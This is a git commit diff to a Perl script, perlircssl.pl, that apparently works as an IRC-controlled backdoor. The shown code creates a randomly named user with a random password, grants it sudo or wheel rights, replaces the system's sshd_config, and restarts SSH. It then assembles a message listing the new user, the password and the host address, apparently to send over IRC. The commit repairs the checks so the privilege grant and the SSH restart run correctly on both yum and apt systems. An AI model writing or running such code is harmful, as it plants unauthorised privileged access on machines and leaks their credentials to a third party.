dfa355945d1b1229827eed64cbdf8539b753cc4d
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-09 02:46:18 -0400

    Update perlircssl.pl

--- perlircssl.pl
+++ perlircssl.pl
@@ -77,11 +77,12 @@ $random_number = int(rand($range)) + $minimum;
 $random_user = sprintf("%08X", rand(0xFFFFFFFF));
 system 'sudo useradd -m ' . $random_user;
 system "echo $random_user:$random_number | sudo chpasswd";
-system 'if [ /usr/bin/yum -a true ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
-system 'if [ /usr/bin/apt -a true ]; then sudo adduser ' . $random_user . ' sudo; fi';
+system 'if [ -f "/usr/bin/yum" ]; then sudo usermod -aG wheel ' . $random_user . '; fi';
+system 'if [ -f "/usr/bin/apt" ]; then sudo adduser ' . $random_user . ' sudo; fi';
 system 'sudo cp sshd_config /etc/ssh/sshd_config';
 system 'sudo cp sshd_banner /etc/ssh/sshd_banner';
-system "sudo service ssh restart";
+system 'if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi';
+system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
   warn 'Getting SSH...';
   $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
   @arr4y = ('9,1Added user:', $random_user, 'password:', $random_number, 'on host:', $address);
